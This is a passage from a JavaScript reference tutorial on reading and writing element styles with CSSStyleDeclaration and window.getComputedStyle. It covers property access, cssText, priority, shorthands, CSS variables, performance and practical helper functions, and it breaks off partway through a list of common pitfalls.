// Reading inline styles
div.style.color; // "" if not set inline
div.style.backgroundColor; // ""
div.style.fontSize; // ""

// Writing inline styles
div.style.color = 'red';
div.style.backgroundColor = 'blue';
div.style.fontSize = '16px';

// Results in: <div style="color: red; background-color: blue; font-size: 16px;"></div>
```

Key characteristics:

- Only reflects inline `style` attribute values
- Ignores stylesheet rules, `<style>` blocks, and external CSS
- Returns empty string for unset properties
- Modifications directly update the `style` attribute
- Changes trigger immediate reflow/repaint

### Property Access Patterns

`CSSStyleDeclaration` supports multiple access methods:

**CamelCase property syntax:**

```javascript
element.style.backgroundColor = 'blue';
element.style.borderTopWidth = '2px';
element.style.marginLeft = '10px';
```

**Bracket notation with kebab-case:**

```javascript
element.style['background-color'] = 'blue';
element.style['border-top-width'] = '2px';
element.style['margin-left'] = '10px';
```

**setProperty/getProperty methods:**

```javascript
element.style.setProperty('background-color', 'blue');
element.style.setProperty('border-top-width', '2px', 'important');
element.style.getPropertyValue('background-color'); // "blue"
element.style.getPropertyPriority('border-top-width'); // "important"
```

**removeProperty method:**

```javascript
element.style.removeProperty('background-color');
// Returns the old value and removes the property
```

CamelCase conversion rules:

- Hyphens are removed
- Character after each hyphen becomes uppercase
- Vendor prefixes: `-webkit-transform` → `webkitTransform`, `-moz-appearance` → `MozAppearance`

### cssText Property

The `cssText` property provides access to the entire style declaration as a string:

```javascript
element.style.cssText = 'color: red; font-size: 16px; margin: 10px;';

console.log(element.style.cssText);
// "color: red; font-size: 16px; margin: 10px;"

// Reading individual properties after setting cssText
element.style.color; // "red"
element.style.fontSize; // "16px"

// Appending to cssText
element.style.cssText += '; background-color: blue;';

// Clearing all inline styles
element.style.cssText = '';
```

Setting `cssText` replaces all existing inline styles. The property value may be normalized and reordered by the browser.

### Computed Styles

`window.getComputedStyle()` returns a read-only `CSSStyleDeclaration` with fully resolved computed values:

```javascript
const div = document.querySelector('div');
const computed = window.getComputedStyle(div);

// Returns actual computed values
computed.color; // "rgb(255, 0, 0)" not "red"
computed.fontSize; // "16px" not "1em"
computed.width; // "300px" computed from layout
computed.display; // "block"

// Includes all properties with computed values
computed.margin; // "10px" (shorthand)
computed.marginTop; // "10px" (longhand)
computed.marginRight; // "10px"
computed.marginBottom; // "10px"
computed.marginLeft; // "10px"

// Pseudo-element styles (second parameter)
const before = window.getComputedStyle(div, '::before');
before.content; // '"Generated content"'
before.display; // Pseudo-element display value
```

Critical differences from inline styles:

- **Read-only**: Assignments have no effect, no errors thrown
- **Complete**: Returns values for all CSS properties
- **Resolved**: Converts relative units to absolute values
- **Live**: Updates when styles change via stylesheet modifications
- **Computed values**: May differ from specified values (colors as `rgb()`, lengths in pixels)

### Property Value Types

CSS properties accept various value types that require specific string formats:

**Length values:**

```javascript
element.style.width = '100px';
element.style.height = '50%';
element.style.margin = '1em';
element.style.padding = '2rem';

// Numbers without units (invalid for most properties)
element.style.width = 100; // Invalid, ignored
element.style.width = '100'; // Invalid, ignored
element.style.lineHeight = 1.5; // Valid (unitless)
element.style.zIndex = 10; // Valid (integer)
```

**Color values:**

```javascript
element.style.color = 'red'; // Named
element.style.color = '#ff0000'; // Hex
element.style.color = 'rgb(255, 0, 0)'; // RGB
element.style.color = 'rgba(255, 0, 0, 0.5)'; // RGBA
element.style.color = 'hsl(0, 100%, 50%)'; // HSL
element.style.color = 'hsla(0, 100%, 50%, 0.5)'; // HSLA
```

**Multiple values:**

```javascript
element.style.margin = '10px 20px'; // Vertical horizontal
element.style.margin = '10px 20px 15px'; // Top horizontal bottom
element.style.margin = '10px 20px 15px 5px'; // Top right bottom left
element.style.boxShadow = '2px 2px 5px rgba(0,0,0,0.3)';
element.style.transform = 'rotate(45deg) scale(1.5)';
```

**Keywords:**

```javascript
element.style.display = 'none';
element.style.position = 'absolute';
element.style.float = 'left';
element.style.clear = 'both';
```

Invalid values are silently ignored:

```javascript
element.style.color = 'not-a-color'; // Ignored, no error
console.log(element.style.color); // Previous value or empty string
```

### Priority and !important

The `setProperty()` method accepts an optional priority parameter:

```javascript
// Set with !important
element.style.setProperty('color', 'red', 'important');

// Check priority
element.style.getPropertyPriority('color'); // "important"

// Remove !important by resetting
element.style.setProperty('color', 'red'); // No priority
element.style.getPropertyPriority('color'); // ""

// Direct property syntax cannot set !important
element.style.color = 'blue !important'; // Ignored, invalid syntax
```

The `cssText` property preserves `!important`:

```javascript
element.style.cssText = 'color: red !important; font-size: 16px;';
element.style.getPropertyPriority('color'); // "important"
element.style.getPropertyPriority('fontSize'); // ""
```

### Shorthand vs Longhand Properties

CSS properties exist in shorthand and longhand forms:

```javascript
// Shorthand sets multiple longhands
element.style.margin = '10px';
console.log(element.style.marginTop); // "10px"
console.log(element.style.marginRight); // "10px"
console.log(element.style.marginBottom); // "10px"
console.log(element.style.marginLeft); // "10px"

// Longhand sets individual values
element.style.marginTop = '20px';
console.log(element.style.margin); // "" (shorthand becomes empty)
console.log(element.style.marginTop); // "20px"

// Setting longhands individually
element.style.marginTop = '10px';
element.style.marginRight = '10px';
element.style.marginBottom = '10px';
element.style.marginLeft = '10px';
console.log(element.style.margin); // "10px" (shorthand reconstructed)
```

Common shorthand/longhand relationships:

- `margin` → `marginTop`, `marginRight`, `marginBottom`, `marginLeft`
- `padding` → `paddingTop`, `paddingRight`, `paddingBottom`, `paddingLeft`
- `border` → `borderWidth`, `borderStyle`, `borderColor` → individual sides
- `background` → `backgroundColor`, `backgroundImage`, `backgroundPosition`, etc.
- `font` → `fontFamily`, `fontSize`, `fontWeight`, `fontStyle`, `lineHeight`

[Inference: Browsers may not always reconstruct shorthand values even when all longhands are set identically, depending on implementation].

### Length Property and Iteration

`CSSStyleDeclaration` has a `length` property indicating the number of explicitly set properties:

```javascript
element.style.cssText = 'color: red; font-size: 16px; margin: 10px;';
console.log(element.style.length); // 3

// Iterate over property names
for (let i = 0; i < element.style.length; i++) {
  const propName = element.style[i];
  const propValue = element.style.getPropertyValue(propName);
  console.log(`${propName}: ${propValue}`);
}

// Alternative iteration
for (const prop of element.style) {
  console.log(`${prop}: ${element.style.getPropertyValue(prop)}`);
}
```

The iteration returns property names in kebab-case format. The order may not match the order specified in `cssText` [Inference: as browsers may normalize and reorder properties].

### Custom Properties (CSS Variables)

CSS custom properties use `--` prefix and require special handling:

```javascript
// Setting custom properties
element.style.setProperty('--main-color', 'blue');
element.style.setProperty('--spacing', '10px');

// Reading custom properties
element.style.getPropertyValue('--main-color'); // "blue"

// Using custom properties
element.style.color = 'var(--main-color)';
element.style.margin = 'var(--spacing)';

// Cannot use camelCase syntax for custom properties
element.style['--main-color'] = 'blue'; // Works with bracket notation
element.style.mainColor; // undefined, not a valid property name
```

Computed styles resolve custom property values:

```javascript
element.style.setProperty('--size', '20px');
element.style.width = 'var(--size)';

const computed = window.getComputedStyle(element);
computed.getPropertyValue('--size'); // "20px"
computed.width; // "20px" (resolved)
```

### Vendor Prefixes

Vendor-prefixed properties require specific naming in JavaScript:

```javascript
// Webkit prefixes (Chrome, Safari, newer Edge)
element.style.webkitTransform = 'rotate(45deg)';
element.style.webkitBorderRadius = '5px';
element.style.webkitBoxShadow = '2px 2px 5px black';

// Mozilla prefixes (Firefox)
element.style.MozAppearance = 'none';
element.style.MozUserSelect = 'none';

// Microsoft prefixes (older Edge, IE)
element.style.msTransform = 'rotate(45deg)';
element.style.msFlexbox = '1';

// Opera prefixes (legacy Opera)
element.style.OTransform = 'rotate(45deg)';
```

Note the capitalization:

- `-webkit-` → `webkit` (lowercase 'w')
- `-moz-` → `Moz` (uppercase 'M')
- `-ms-` → `ms` (lowercase)
- `-o-` → `O` (uppercase 'O')

Modern CSS feature detection:

```javascript
// Check if property is supported
if ('transform' in element.style) {
  element.style.transform = 'rotate(45deg)';
} else if ('webkitTransform' in element.style) {
  element.style.webkitTransform = 'rotate(45deg)';
}
```

### Performance Implications

Modifying `style` properties triggers reflows and repaints:

```javascript
// Multiple reflows (inefficient)
element.style.width = '100px'; // Reflow
element.style.height = '100px'; // Reflow
element.style.margin = '10px'; // Reflow

// Single reflow using cssText
element.style.cssText = 'width: 100px; height: 100px; margin: 10px;';

// Single reflow using class
element.className = 'sized-element'; // CSS rule handles all properties
```

Reading computed styles forces synchronous layout:

```javascript
element.style.width = '100px';
const width = window.getComputedStyle(element).width; // Forces layout
element.style.height = width; // Another layout
// Two synchronous layouts (layout thrashing)

// Batch reads and writes
const width1 = window.getComputedStyle(element1).width;
const width2 = window.getComputedStyle(element2).width; // Reads together
element1.style.height = width1; // Then writes
element2.style.height = width2;
```

[Inference: Modern browsers batch DOM writes within the same execution frame when possible, but explicit read-write-read-write patterns force synchronous layouts].

### Specificity and Cascade Behavior

Inline styles set via `element.style` have high specificity (1,0,0,0):

```css
/* External stylesheet */
div { color: blue !important; }
#myDiv { color: green; }
.myClass { color: yellow; }
```

```javascript
const div = document.querySelector('div#myDiv.myClass');

div.style.color = 'red';
// Color is red (inline style wins over ID/class selectors)

// But !important in stylesheet wins
div.style.color = 'red'; // Blue displays (!important overrides inline)

// Set inline !important to override
div.style.setProperty('color', 'red', 'important'); // Red displays
```

Removing inline styles allows cascade to apply:

```javascript
div.style.color = 'red'; // Red displays
div.style.color = ''; // Cascade applies, color from stylesheet
div.style.removeProperty('color'); // Same effect
```

### Stylesheet Rule Styles

`CSSStyleRule` objects in stylesheets have `style` properties:

```javascript
const sheet = document.styleSheets[0];
const rules = sheet.cssRules || sheet.rules;

for (const rule of rules) {
  if (rule.type === CSSRule.STYLE_RULE) {
    console.log(rule.selectorText); // ".my-class"
    console.log(rule.style.color); // "red"
    
    // Modify stylesheet rule
    rule.style.color = 'blue'; // Affects all matching elements
    rule.style.setProperty('font-size', '18px');
  }
}
```

Modifying stylesheet rules affects all elements matching the selector simultaneously.

### AttributeStyleMap API (Modern Alternative)

The CSS Typed OM introduces `attributeStyleMap` as a typed alternative:

```javascript
// Traditional CSSStyleDeclaration
element.style.opacity = '0.5';
element.style.opacity; // "0.5" (string)

// CSS Typed OM (if supported)
if (element.attributeStyleMap) {
  element.attributeStyleMap.set('opacity', 0.5);
  element.attributeStyleMap.get('opacity').value; // 0.5 (number)
  
  element.attributeStyleMap.set('width', CSS.px(100));
  element.attributeStyleMap.get('width').value; // 100
  element.attributeStyleMap.get('width').unit; // "px"
}
```

[Unverified: Browser support for `attributeStyleMap` varies; `CSSStyleDeclaration` remains the universally supported interface].

### Null and Empty String Behavior

Different assignment values produce specific behaviors:

```javascript
element.style.color = 'red';

// Empty string removes the property
element.style.color = '';
console.log(element.style.color); // ""
element.getAttribute('style'); // No color property

// Null converts to "null" (invalid value, ignored)
element.style.color = null;
console.log(element.style.color); // Previous value or ""

// Undefined converts to "undefined" (invalid value, ignored)
element.style.color = undefined;
console.log(element.style.color); // Previous value or ""
```

To remove properties:

```javascript
element.style.color = ''; // Recommended
element.style.removeProperty('color'); // Explicit removal
delete element.style.color; // Does nothing, not recommended
```

### Browser Normalization

Browsers normalize and serialize style values:

```javascript
element.style.margin = '10px 10px 10px 10px';
console.log(element.style.margin); // "10px" (normalized)

element.style.color = 'red';
console.log(element.style.color); // May be "red" or "rgb(255, 0, 0)"

element.style.border = '1px solid black';
console.log(element.style.border); 
// May be shorthand or expanded to longhands
```

[Inference: Exact serialization behavior varies by browser and property type, though standard properties generally normalize predictably].

---

## getComputedStyle

### Basic Syntax

```javascript
window.getComputedStyle(element, [pseudoElement])
```

**Parameters:**

- `element` (Element): The element to get computed styles for
- `pseudoElement` (string, optional): A pseudo-element selector (e.g., "::before", "::after", "::first-line")

**Returns:** A live `CSSStyleDeclaration` object containing all computed CSS property values for the element

### Basic Usage

```javascript
const element = document.querySelector('.box');
const styles = window.getComputedStyle(element);

console.log(styles.color); // "rgb(255, 0, 0)"
console.log(styles.fontSize); // "16px"
console.log(styles.display); // "block"
console.log(styles.width); // "200px"
```

### Computed vs Inline vs Stylesheet Styles

**Three Ways to Access Styles:**

```javascript
const div = document.createElement('div');
div.style.color = 'red'; // Inline style
div.style.width = '100px';
document.body.appendChild(div);

// CSS in stylesheet:
// .box { color: blue; padding: 20px; }
div.className = 'box';

// 1. Inline styles (element.style)
console.log(div.style.color); // "red" (only inline)
console.log(div.style.padding); // "" (not inline, so empty)
console.log(div.style.display); // "" (default, not set inline)

// 2. Computed styles (getComputedStyle)
const computed = getComputedStyle(div);
console.log(computed.color); // "rgb(255, 0, 0)" (inline wins)
console.log(computed.padding); // "20px" (from stylesheet)
console.log(computed.display); // "block" (browser default)
```

**Key Differences:**

|Feature|`element.style`|`getComputedStyle()`|
|---|---|---|
|Access|Read/Write|Read-only|
|Scope|Inline styles only|All applied styles|
|Values|As written|Computed/absolute|
|Shorthand|Preserves shorthand|Returns longhand|
|Defaults|Empty string|Browser defaults included|

### Return Value Details

**CSSStyleDeclaration Object:**

```javascript
const styles = getComputedStyle(element);

console.log(typeof styles); // "object"
console.log(styles instanceof CSSStyleDeclaration); // true
console.log(styles.length); // ~300+ (number of CSS properties)

// Access methods
styles.getPropertyValue('color'); // "rgb(255, 0, 0)"
styles.getPropertyPriority('color'); // "" (always empty for computed)
styles.item(0); // First property name
```

**Live Object:**

```javascript
const element = document.querySelector('div');
const styles = getComputedStyle(element);

console.log(styles.color); // "rgb(0, 0, 0)"

element.style.color = 'red';

console.log(styles.color); // "rgb(255, 0, 0)" (updates automatically)
```

The returned object is live and reflects the current computed styles. Changes to the element's styles are immediately reflected.

### Absolute and Computed Values

`getComputedStyle` returns resolved, absolute values:

```javascript
// CSS: font-size: 1.5em; (parent has 16px)
const styles = getComputedStyle(element);

console.log(styles.fontSize); // "24px" (computed: 16 * 1.5)
// Not "1.5em"

// CSS: width: 50%;
console.log(styles.width); // "400px" (if parent is 800px wide)
// Not "50%"

// CSS: color: currentColor;
console.log(styles.color); // "rgb(0, 0, 0)" (resolved value)
// Not "currentColor"

// CSS: margin: auto;
console.log(styles.marginLeft); // "0px" or computed pixel value
// Not "auto"
```

### Property Name Formats

**camelCase (JavaScript):**

```javascript
const styles = getComputedStyle(element);

styles.backgroundColor; // "rgb(255, 255, 255)"
styles.fontSize; // "16px"
styles.borderTopWidth; // "1px"
styles.zIndex; // "1"
```

**kebab-case (CSS):**

```javascript
styles.getPropertyValue('background-color'); // "rgb(255, 255, 255)"
styles.getPropertyValue('font-size'); // "16px"
styles.getPropertyValue('border-top-width'); // "1px"
styles.getPropertyValue('z-index'); // "1"
```

**Both work:**

```javascript
// These are equivalent
styles.backgroundColor;
styles['background-color'];
styles.getPropertyValue('background-color');
```

### Color Values

Colors are returned in `rgb()` or `rgba()` format:

```javascript
// CSS: color: red;
const styles = getComputedStyle(element);

console.log(styles.color); // "rgb(255, 0, 0)"
// Not "red"

// CSS: color: #ff0000;
console.log(styles.color); // "rgb(255, 0, 0)"
// Not "#ff0000"

// CSS: color: rgba(255, 0, 0, 0.5);
console.log(styles.color); // "rgba(255, 0, 0, 0.5)"

// CSS: background-color: transparent;
console.log(styles.backgroundColor); // "rgba(0, 0, 0, 0)"
```

### Shorthand vs Longhand Properties

Shorthand properties may return empty strings or unexpected values. Use longhand properties:

```javascript
// CSS: margin: 10px 20px;
const styles = getComputedStyle(element);

// Shorthand - unreliable
console.log(styles.margin); // "" or "10px 20px" (browser-dependent)

// Longhand - reliable
console.log(styles.marginTop); // "10px"
console.log(styles.marginRight); // "20px"
console.log(styles.marginBottom); // "10px"
console.log(styles.marginLeft); // "20px"

// CSS: border: 1px solid red;
console.log(styles.border); // "" (often empty)

// Use longhand instead
console.log(styles.borderTopWidth); // "1px"
console.log(styles.borderTopStyle); // "solid"
console.log(styles.borderTopColor); // "rgb(255, 0, 0)"
```

**Recommendation:** Always use longhand property names for reliable results.

### Pseudo-Elements

Access styles of pseudo-elements using the second parameter:

```javascript
// CSS:
// .box::before {
//   content: "›";
//   color: blue;
//   font-size: 20px;
// }

const element = document.querySelector('.box');

// Pseudo-element styles
const beforeStyles = getComputedStyle(element, '::before');
console.log(beforeStyles.content); // '"›"' (includes quotes)
console.log(beforeStyles.color); // "rgb(0, 0, 255)"
console.log(beforeStyles.fontSize); // "20px"

const afterStyles = getComputedStyle(element, '::after');
console.log(afterStyles.display); // "inline" or "none"

// Other pseudo-elements
getComputedStyle(element, '::first-line');
getComputedStyle(element, '::first-letter');
getComputedStyle(element, '::selection');
getComputedStyle(element, '::placeholder');
```

**Legacy Syntax:**

```javascript
// Single colon (legacy, still works)
getComputedStyle(element, ':before');
getComputedStyle(element, ':after');

// Double colon (modern, preferred)
getComputedStyle(element, '::before');
getComputedStyle(element, '::after');
```

### Display and Visibility

```javascript
const styles = getComputedStyle(element);

// Display
console.log(styles.display); // "block", "inline", "flex", "none", etc.

// Visibility
console.log(styles.visibility); // "visible", "hidden", "collapse"

// Opacity
console.log(styles.opacity); // "1", "0.5", etc.

// Checking if element is visible
function isVisible(element) {
  const styles = getComputedStyle(element);
  return styles.display !== 'none' 
    && styles.visibility !== 'hidden' 
    && styles.opacity !== '0';
}
```

### Dimensions and Position

```javascript
const styles = getComputedStyle(element);

// Dimensions
console.log(styles.width); // "200px"
console.log(styles.height); // "100px"
console.log(styles.minWidth); // "0px"
console.log(styles.maxWidth); // "none" or "500px"

// Box model
console.log(styles.paddingTop); // "10px"
console.log(styles.paddingRight); // "10px"
console.log(styles.borderTopWidth); // "1px"
console.log(styles.marginTop); // "20px"

// Position
console.log(styles.position); // "static", "relative", "absolute", "fixed"
console.log(styles.top); // "auto" or "10px"
console.log(styles.left); // "auto" or "20px"
console.log(styles.zIndex); // "auto" or "10"
```

### Box Sizing

```javascript
const styles = getComputedStyle(element);

console.log(styles.boxSizing); // "content-box" or "border-box"

// Calculate total width including padding and border
function getTotalWidth(element) {
  const styles = getComputedStyle(element);
  const width = parseFloat(styles.width);
  
  if (styles.boxSizing === 'border-box') {
    return width; // Already includes padding and border
  }
  
  // content-box: add padding and border
  const paddingLeft = parseFloat(styles.paddingLeft);
  const paddingRight = parseFloat(styles.paddingRight);
  const borderLeft = parseFloat(styles.borderLeftWidth);
  const borderRight = parseFloat(styles.borderRightWidth);
  
  return width + paddingLeft + paddingRight + borderLeft + borderRight;
}
```

### Font Properties

```javascript
const styles = getComputedStyle(element);

console.log(styles.fontFamily); // '"Arial", sans-serif'
console.log(styles.fontSize); // "16px"
console.log(styles.fontWeight); // "400" or "700" (numeric)
console.log(styles.fontStyle); // "normal" or "italic"
console.log(styles.lineHeight); // "24px" (computed to pixels)
console.log(styles.textAlign); // "left", "center", "right", "justify"
console.log(styles.textDecoration); // "none" or "underline solid rgb(0, 0, 0)"
console.log(styles.textTransform); // "none", "uppercase", "lowercase", "capitalize"
console.log(styles.letterSpacing); // "normal" or "2px"
console.log(styles.wordSpacing); // "normal" or "4px"
```

### Transform and Animation Properties

```javascript
const styles = getComputedStyle(element);

// Transform
console.log(styles.transform); 
// "matrix(1, 0, 0, 1, 10, 20)" or "none"

// Transition
console.log(styles.transitionProperty); // "all" or "opacity, transform"
console.log(styles.transitionDuration); // "0.3s"
console.log(styles.transitionTimingFunction); // "ease"
console.log(styles.transitionDelay); // "0s"

// Animation
console.log(styles.animationName); // "slidein" or "none"
console.log(styles.animationDuration); // "2s"
console.log(styles.animationIterationCount); // "infinite" or "3"
```

### Flexbox Properties

```javascript
const container = document.querySelector('.flex-container');
const styles = getComputedStyle(container);

// Container properties
console.log(styles.display); // "flex"
console.log(styles.flexDirection); // "row", "column", "row-reverse", etc.
console.log(styles.flexWrap); // "nowrap", "wrap", "wrap-reverse"
console.log(styles.justifyContent); // "flex-start", "center", "space-between", etc.
console.log(styles.alignItems); // "stretch", "center", "flex-start", etc.
console.log(styles.alignContent); // "stretch", "center", etc.
console.log(styles.gap); // "10px" or "10px 20px"

// Item properties
const item = container.firstElementChild;
const itemStyles = getComputedStyle(item);
console.log(itemStyles.flexGrow); // "0", "1", etc.
console.log(itemStyles.flexShrink); // "1", "0", etc.
console.log(itemStyles.flexBasis); // "auto" or "200px"
console.log(itemStyles.alignSelf); // "auto", "center", etc.
console.log(itemStyles.order); // "0", "1", "-1", etc.
```

### Grid Properties

```javascript
const grid = document.querySelector('.grid-container');
const styles = getComputedStyle(grid);

// Container properties
console.log(styles.display); // "grid"
console.log(styles.gridTemplateColumns); // "200px 1fr 1fr"
console.log(styles.gridTemplateRows); // "100px auto"
console.log(styles.gridAutoFlow); // "row", "column", "dense"
console.log(styles.gap); // "10px" or "10px 20px"
console.log(styles.justifyItems); // "stretch", "center", etc.
console.log(styles.alignItems); // "stretch", "center", etc.

// Item properties
const gridItem = grid.firstElementChild;
const itemStyles = getComputedStyle(gridItem);
console.log(itemStyles.gridColumnStart); // "1" or "auto"
console.log(itemStyles.gridColumnEnd); // "3" or "auto"
console.log(itemStyles.gridRowStart); // "1"
console.log(itemStyles.gridRowEnd); // "2"
```

### Custom Properties (CSS Variables)

```javascript
// CSS:
// :root {
//   --main-color: #ff0000;
//   --spacing: 20px;
// }

const styles = getComputedStyle(document.documentElement);

console.log(styles.getPropertyValue('--main-color')); // "#ff0000"
console.log(styles.getPropertyValue('--spacing')); // "20px"

// Element-specific variable
const element = document.querySelector('.box');
const elementStyles = getComputedStyle(element);
console.log(elementStyles.getPropertyValue('--local-var')); // Value or ""

// Using variable value
const color = styles.getPropertyValue('--main-color').trim();
element.style.backgroundColor = color;
```

**Note:** Custom properties are case-sensitive and must be accessed with `getPropertyValue()`.

### Parsing Numeric Values

```javascript
const styles = getComputedStyle(element);

// parseFloat for single values
const width = parseFloat(styles.width); // 200 (number)
const fontSize = parseFloat(styles.fontSize); // 16

// parseInt for integers
const zIndex = parseInt(styles.zIndex); // 10

// Handling "auto", "none", etc.
function getNumericValue(value, defaultValue = 0) {
  const parsed = parseFloat(value);
  return isNaN(parsed) ? defaultValue : parsed;
}

const top = getNumericValue(styles.top); // 0 if "auto"
```

### Multi-Value Properties

```javascript
const styles = getComputedStyle(element);

// Transform (matrix)
const transform = styles.transform;
// "matrix(1, 0, 0, 1, 10, 20)"

// Parse matrix values
function parseMatrix(matrixString) {
  const values = matrixString.match(/matrix.*\((.+)\)/);
  if (values) {
    return values[1].split(', ').map(parseFloat);
  }
  return null;
}

const matrix = parseMatrix(transform);
// [1, 0, 0, 1, 10, 20]
// translateX = matrix[4], translateY = matrix[5]

// Box shadow
console.log(styles.boxShadow);
// "rgb(0, 0, 0) 2px 2px 4px 0px"

// Text shadow
console.log(styles.textShadow);
// "rgb(0, 0, 0) 1px 1px 2px"
```

### Filter Property

```javascript
const styles = getComputedStyle(element);

console.log(styles.filter);
// "blur(5px) brightness(1.2)"
// or "none"

// Individual filter functions are not separately accessible
// Must parse the filter string if you need individual values
```

### Background Properties

```javascript
const styles = getComputedStyle(element);

// Background color
console.log(styles.backgroundColor); // "rgb(255, 255, 255)"

// Background image
console.log(styles.backgroundImage);
// 'url("image.jpg")' or "none"
// Multiple: 'url("img1.jpg"), url("img2.jpg")'

// Background position
console.log(styles.backgroundPosition); // "0% 0%"
console.log(styles.backgroundPositionX); // "0%"
console.log(styles.backgroundPositionY); // "0%"

// Background size
console.log(styles.backgroundSize); // "auto" or "cover" or "100px 200px"

// Background repeat
console.log(styles.backgroundRepeat); // "repeat", "no-repeat", etc.

// Background attachment
console.log(styles.backgroundAttachment); // "scroll" or "fixed"

// Background clip/origin
console.log(styles.backgroundClip); // "border-box", "padding-box", "content-box"
console.log(styles.backgroundOrigin); // "padding-box", etc.
```

### Border Radius

```javascript
const styles = getComputedStyle(element);

// Individual corners
console.log(styles.borderTopLeftRadius); // "10px"
console.log(styles.borderTopRightRadius); // "10px"
console.log(styles.borderBottomRightRadius); // "10px"
console.log(styles.borderBottomLeftRadius); // "10px"

// Shorthand (unreliable)
console.log(styles.borderRadius); // May be empty

// Elliptical radius (if specified)
// CSS: border-radius: 50px / 25px;
console.log(styles.borderTopLeftRadius); // "50px 25px"
```

### Overflow Properties

```javascript
const styles = getComputedStyle(element);

console.log(styles.overflow); // "visible", "hidden", "scroll", "auto"
console.log(styles.overflowX); // Individual axis
console.log(styles.overflowY); // Individual axis
console.log(styles.overflowWrap); // "normal" or "break-word"
console.log(styles.textOverflow); // "clip" or "ellipsis"
console.log(styles.whiteSpace); // "normal", "nowrap", "pre", etc.
```

### Cursor and Pointer Events

```javascript
const styles = getComputedStyle(element);

console.log(styles.cursor);
// "auto", "pointer", "move", "not-allowed", etc.
// or 'url("cursor.png"), pointer'

console.log(styles.pointerEvents); // "auto" or "none"
console.log(styles.userSelect); // "auto", "none", "text", "all"
```

### Performance Considerations

**Triggering Reflow:**

[Inference: Based on browser rendering behavior] Accessing `getComputedStyle` forces the browser to recalculate styles and potentially trigger layout reflow if styles have changed:

```javascript
// Inefficient - multiple reflows
for (let i = 0; i < elements.length; i++) {
  const styles = getComputedStyle(elements[i]);
  console.log(styles.width); // Potential reflow each iteration
  elements[i].style.height = styles.width; // Causes layout change
}

// Better - batch reads, then batch writes
const widths = [];
for (let i = 0; i < elements.length; i++) {
  const styles = getComputedStyle(elements[i]);
  widths.push(styles.width);
}

for (let i = 0; i < elements.length; i++) {
  elements[i].style.height = widths[i];
}
```

**Caching Results:**

```javascript
// If styles won't change, cache the result
const element = document.querySelector('.box');
const styles = getComputedStyle(element);

// Use the same styles object multiple times
const color = styles.color;
const fontSize = styles.fontSize;
const padding = styles.padding;

// Don't call getComputedStyle repeatedly for same element
```

**Note:** The `CSSStyleDeclaration` object is live, so caching only helps if you're accessing multiple properties in quick succession before any style changes.

### Hidden Elements

```javascript
// Element with display: none
const hidden = document.querySelector('.hidden');
const styles = getComputedStyle(hidden);

// Most properties still return computed values
console.log(styles.color); // "rgb(0, 0, 0)"
console.log(styles.fontSize); // "16px"

// But layout-related properties may be affected
console.log(styles.display); // "none"
console.log(styles.width); // "auto" or actual computed value
console.log(styles.height); // "auto" or actual computed value

// offsetWidth/offsetHeight are 0 for display:none
console.log(hidden.offsetWidth); // 0
console.log(hidden.offsetHeight); // 0
```

### Detached Elements

Elements not in the document still have computed styles:

```javascript
const div = document.createElement('div');
// Not appended to document

const styles = getComputedStyle(div);

console.log(styles.display); // "block" (default for div)
console.log(styles.color); // "rgb(0, 0, 0)" (browser default)
console.log(styles.fontSize); // "16px" (browser default)

// But dimensions may be 0 or auto
console.log(styles.width); // "auto"
console.log(styles.height); // "auto"
```

### Window Prefix

`getComputedStyle` is technically a method of the `window` object:

```javascript
// These are equivalent
window.getComputedStyle(element);
getComputedStyle(element); // window is implicit in global scope

// Can be useful in strict contexts
const computedStyles = window.getComputedStyle.bind(window);
const styles = computedStyles(element);
```

### Cross-Browser Considerations

**Legacy IE (IE8 and earlier):** Used `element.currentStyle` instead of `getComputedStyle`:

```javascript
// Modern browsers
const styles = getComputedStyle(element);

// Legacy IE polyfill pattern (no longer needed for modern development)
function getStyles(element) {
  return window.getComputedStyle 
    ? getComputedStyle(element) 
    : element.currentStyle;
}
```

**Modern browsers:** `getComputedStyle` has excellent support in all current browsers (Chrome, Firefox, Safari, Edge).

### Practical Use Cases

**Get Actual Dimensions:**

```javascript
function getActualDimensions(element) {
  const styles = getComputedStyle(element);
  return {
    width: parseFloat(styles.width),
    height: parseFloat(styles.height),
    paddingTop: parseFloat(styles.paddingTop),
    paddingRight: parseFloat(styles.paddingRight),
    paddingBottom: parseFloat(styles.paddingBottom),
    paddingLeft: parseFloat(styles.paddingLeft),
    borderWidth: {
      top: parseFloat(styles.borderTopWidth),
      right: parseFloat(styles.borderRightWidth),
      bottom: parseFloat(styles.borderBottomWidth),
      left: parseFloat(styles.borderLeftWidth)
    }
  };
}
```

**Check if Element is Fixed:**

```javascript
function isPositionFixed(element) {
  while (element && element !== document.body) {
    const styles = getComputedStyle(element);
    if (styles.position === 'fixed') {
      return true;
    }
    element = element.parentElement;
  }
  return false;
}
```

**Get Effective Z-Index:**

```javascript
function getEffectiveZIndex(element) {
  let current = element;
  let maxZIndex = -Infinity;
  
  while (current && current !== document.body) {
    const styles = getComputedStyle(current);
    const position = styles.position;
    
    if (position !== 'static') {
      const zIndex = parseInt(styles.zIndex);
      if (!isNaN(zIndex)) {
        maxZIndex = Math.max(maxZIndex, zIndex);
      }
    }
    
    current = current.parentElement;
  }
  
  return maxZIndex === -Infinity ? 'auto' : maxZIndex;
}
```

**Check Visibility:**

```javascript
function isElementVisible(element) {
  if (!element) return false;
  
  const styles = getComputedStyle(element);
  
  // Check display
  if (styles.display === 'none') return false;
  
  // Check visibility
  if (styles.visibility === 'hidden') return false;
  
  // Check opacity
  if (styles.opacity === '0') return false;
  
  // Check parent visibility recursively
  const parent = element.parentElement;
  if (parent && parent !== document.body) {
    return isElementVisible(parent);
  }
  
  return true;
}
```

**Copy All Styles:**

```javascript
function copyComputedStyles(source, target) {
  const styles = getComputedStyle(source);
  
  for (let i = 0; i < styles.length; i++) {
    const property = styles[i];
    const value = styles.getPropertyValue(property);
    target.style.setProperty(property, value);
  }
}
```

**Get Inherited Color:**

```javascript
function getInheritedColor(element) {
  let current = element;
  
  while (current) {
    const styles = getComputedStyle(current);
    const color = styles.color;
    
    // If color is explicitly set (not inherited default)
    if (color !== 'rgb(0, 0, 0)' || current === document.body) {
      return color;
    }
    
    current = current.parentElement;
  }
  
  return 'rgb(0, 0, 0)'; // Default
}
```

### Common Pitfalls

**Pitfall 1: Expecting Shorthand Properties**

```javascript
// Wrong - may return empty string
const styles = getComputedStyle(element);
console.log(styles.margin); // "" (unreliable)

// Correct - use longhand
console.log(styles.marginTop); // "10px"
console.log(styles.marginRight); // "10px"
```

**Pitfall 2: Forgetting to Parse Numbers**

```javascript
const styles = getComputedStyle(element);

// Wrong - string concatenation
const newWidth = styles.width + 10; // "200px10"

// Correct - parse first
